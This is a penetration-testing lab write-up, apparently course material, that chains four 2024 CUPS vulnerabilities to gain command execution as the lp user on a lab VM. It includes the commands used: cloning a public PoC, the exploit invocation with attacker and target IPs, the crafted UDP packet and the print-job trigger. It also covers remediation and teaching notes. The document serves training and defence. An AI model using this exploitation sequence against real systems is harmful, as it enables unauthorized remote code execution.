# Activity: CUPS Full RCE Chain

## Summary

Full exploitation of the 2024 CUPS RCE chain, building on the detection-stage confirmation in `r-12- cups-print-service-reconnaissance.md` and `r-13- cups-discovery-ip-change.md`. A single unauthenticated UDP packet to port 631 causes `cups-browsed` to create a local print queue pointing at an attacker-controlled fake IPP server; the fake server's crafted attribute response injects a malicious `FoomaticRIPCommandLine` directive into the generated PPD file; sending a print job to that queue then executes the injected command as the `lp` user. Validated end-to-end against the target with a working command-execution artefact confirmed on disk.

## Environment

| Item | Value |
|---|---|
| Target | 192.168.144.132 |
| Vulnerable components | cups-browsed 1.28.17-3, libcupsfilters1 1.28.17-3, cups-filters 1.28.17-3 (all pre-`+deb12u1`) |
| Attacker | Kali, 192.168.144.129 |
| Tooling | `0xCZR1/PoC-Cups-RCE-CVE-exploit-chain` (`cups-rce.py`), Python 3, `ippserver` |
| CVEs chained | CVE-2024-47176 (unauth UDP trigger), CVE-2024-47076 (unsanitised IPP attribute validation), CVE-2024-47175 (unsanitised PPD generation), CVE-2024-47177 (FoomaticRIPCommandLine command execution) |

## Vulnerability Chain

1. **CVE-2024-47176**: `cups-browsed` binds to `UDP 0.0.0.0:631` and trusts any source. A crafted legacy browse packet naming an attacker-controlled URL as a "printer" causes `cups-browsed` to create a local queue and issue a `Get-Printer-Attributes` IPP request to that URL.
2. **CVE-2024-47076**: `libcupsfilters`' `cfGetPrinterAttributes5()` does not validate the IPP attributes returned by that (attacker-controlled) server.
3. **CVE-2024-47175**: `libppd`'s `ppdCreatePPDFromIPP2()` writes those unvalidated attributes directly into a generated PPD file with no sanitisation, allowing a crafted attribute value to inject entirely new PPD directives.
4. **CVE-2024-47177**: the injected `*FoomaticRIPCommandLine` directive is executed verbatim by `foomatic-rip` whenever a print job is sent to that printer, giving arbitrary command execution as the `lp` user.

## Tooling Attempted

Two approaches were attempted before finding one that worked cleanly against this target, both are worth recording since the troubleshooting itself is instructive.

**Metasploit's `exploit/multi/misc/cups_ipp_remote_code_execution`** was tried first (natively available on Kali, no external download needed). Its own `info` confirms it targets exactly this CVE chain, requires no reachable CUPS ports, and executes as the `lp` user. However, every run attempt failed identically with `Errno::ENODEV No such device - setsockopt(2)`, a Ruby-level multicast socket error, most likely arising from the module's mDNS/DNS-SD printer-advertisement code failing on Kali's network configuration (the lab's `eth0` interface has no routable IPv6, a known trigger for this class of Ruby socket error; explicitly setting `SRVHOST` and disabling IPv6 on the interface were both tried and neither resolved it). This is recorded as a genuine tool-compatibility finding for this specific lab network configuration, not a flaw in the underlying exploit logic; the module may work correctly in environments with different network/IPv6 characteristics.

**`0xCZR1/PoC-Cups-RCE-CVE-exploit-chain`** (a Python implementation using the `ippserver` library, cloned via GitHub while the disposable VM was temporarily on NAT) was used instead and worked correctly on the first properly-formed attempt.

## Exploitation

**On Kali**, dependencies installed and the tool cloned:
```bash
git clone https://github.com/0xCZR1/PoC-Cups-RCE-CVE-exploit-chain.git
cd PoC-Cups-RCE-CVE-exploit-chain
pip install -r requirements.txt --break-system-packages
```

**On Kali**, the actual script is `cups-rce.py` (the README's usage example references a stale filename, `poc.py`, which does not exist in the repository; this was confirmed by listing the repo's actual files):
```bash
python3 cups-rce.py 192.168.144.129 192.168.144.132 "touch /tmp/CUPS_RCE_PWNED"
```

Output:
```
Starting IPP server at ('192.168.144.129', 12349)
Sending UDP packet to 192.168.144.132:631...
Packet content:
2 3 http://192.168.144.129:12349/printers/EVILCUPS "Pwned Location" "Pwned Printer" "HP LaserJet 1020"
```

The script's packet uses type `2` (versus the `0` used in the manual reconnaissance tests) and includes a fourth quoted field for a make-and-model string, both accepted correctly by `cups-browsed`.

**On the target** (SSH as `uow-admin@192.168.144.132`), confirming the malicious queue was created and accepted, not torn down as it was during the earlier manual/Metasploit-auxiliary attempts that lacked a real IPP attribute response:
```bash
lpstat -p
```
```
printer Pwned_Printer_192_168_144_129 is idle.  enabled since Tue 25 Aug 2026 01:26:29 AM BST
```

**On the target** (same session), triggering the print job that fires the injected command. This step cannot be performed remotely by the attacker; it represents the "user interaction" precondition the vulnerability advisories describe, something on the target must send a print job to the malicious queue:
```bash
lpr -P Pwned_Printer_192_168_144_129 /etc/hostname
```

## Evidence

**On the target** (same session), confirming code execution:
```bash
ls -la /tmp/CUPS_RCE_PWNED
```
```
-rw------- 1 lp lp 0 Aug 25 01:27 /tmp/CUPS_RCE_PWNED
```

The file exists, owned by `lp:lp`, confirming the injected `touch` command executed with the privileges of the CUPS print-service account, exactly matching the vulnerability's documented impact (code execution "in the context of the lp user," per Metasploit's own module description and multiple independent research writeups).

## Outcome

Confirmed full unauthenticated remote code execution via the chained CVE-2024-47176/47076/47175/47177 vulnerability set, from an unauthenticated network position with no prior access or credentials required, contingent only on a print job being sent to the malicious queue by a local process or user on the target. Command execution occurs as the `lp` user, not root; privilege escalation from `lp` to a higher-privilege account would require a separate, subsequent vulnerability, not investigated in this activity.

## Impact and Privilege Level

Checking the actual running processes on the target confirms both CUPS daemons run as root:

```bash
ps aux | grep -i cups
```
```
root  1129  /usr/sbin/cupsd -l
root  3668  /usr/sbin/cups-browsed
lp    4148  /usr/lib/cups/notifier/dbus
```

Despite `cupsd` and `cups-browsed` themselves running as root, exploitation lands as `lp`, not root, and this is not incidental to this particular run, it is a structural, designed privilege boundary in CUPS itself. CUPS deliberately drops privileges from root down to the unprivileged `lp` account before invoking any print filter or backend, including `foomatic-rip`, which is precisely the component this exploit chain targets (CVE-2024-47177). The root-owned daemon processes need root to bind privileged ports and manage the system as a whole, but the actual document-processing/filter pipeline, exactly the code path this vulnerability exploits, always executes with those privileges already dropped.

This means the `lp`-level outcome is independent of which account is logged into the system, or what other accounts/privileges exist on the box at the time. Any student exploiting this chain against this target will land at the same `lp` foothold, since the privilege ceiling is fixed by CUPS's own architecture, not by session state. Reaching further than `lp` would require identifying and chaining a separate, subsequent privilege escalation vulnerability from that foothold, following the same multi-stage pattern already demonstrated elsewhere on this VM (e.g. the low-privilege RCE → shadow-read → credential-cracking → SUID-nano chain documented in `e-06` through `e-08`).

## Remediation

- Upgrade `cups-filters`, `cups-browsed`, and `libcupsfilters1` to `1.28.17-3+deb12u1` or later (already the case on any unmodified Debian 12 system as of September 2024).
- Remove `cups-browsed` entirely on systems that do not need to auto-discover shared network printers.
- Restrict `BrowseRemoteProtocols` to exclude the legacy `cups` protocol.
- Firewall UDP/631 from untrusted network segments.

## Teaching Notes

The tool-compatibility issue encountered with the Metasploit module before switching to the Python PoC is worth preserving in the write-up rather than discarding once the second tool worked: a purpose-built exploit module can fail for reasons entirely unrelated to whether the underlying vulnerability exists (here, a Ruby multicast socket bug specific to Kali's network/IPv6 configuration), and recognising a tool failure versus a target-side negative result is itself an important diagnostic skill, one this project has emphasised repeatedly across the FTP, distcc, and MySQL reconnaissance activities.

The `lp`-user, not-root outcome documented in the Impact and Privilege Level section is a good discussion point on privilege boundaries generally: "unauthenticated RCE" does not automatically mean root-level compromise, and CUPS's deliberate root-to-`lp` privilege drop before invoking filters is a real-world example of the principle of least privilege actually working as designed, containing the blast radius of a serious vulnerability even though it couldn't prevent exploitation entirely.

This is a strong Level 7 capstone exercise: it requires chaining four distinct CVEs across three separate components, understanding IPP as a protocol, understanding how a generated configuration file (PPD) can become a code-execution primitive when attacker-controlled data is written into it unsanitised, and recognising that the final trigger step is outside the attacker's direct control.

## Lab Dependencies

**Prerequisite exploit(s):** Confirmed detection-stage vulnerability from `r-12- cups-print-service-reconnaissance.md` and `r-13- cups-discovery-ip-change.md`
**Required starting access:** Network access to the target; NAT temporarily for cloning the PoC tooling
**Starting account:** None
**Resulting access:** Command execution as the `lp` user
**Suggested teaching level:** Level 7
